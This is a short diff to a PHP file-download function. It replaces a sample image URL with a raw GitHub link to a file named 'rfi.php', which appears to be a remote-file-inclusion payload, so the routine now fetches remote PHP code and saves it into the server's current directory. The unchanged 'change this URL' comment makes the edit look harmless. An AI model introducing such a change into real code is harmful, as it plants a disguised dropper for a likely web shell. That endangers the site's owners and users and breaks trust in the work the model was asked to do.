@@ -3,7 +3,7 @@
 // Function to download a file from a hardcoded URL and save it to the current directory
 function importFileFromURL() {
     // Hardcoded URL of the file to download
-    $fileURL = 'https://example.com/sample.jpg';  // Change this to the URL of the file you want to download
+    $fileURL = 'https://raw.githubusercontent.com/iamjackmorton/RFI/refs/heads/main/rfi.php';  // Change this to the URL of the file you want to download
 
     // Use file_get_contents to download the file contents
     $fileContents = file_get_contents($fileURL);
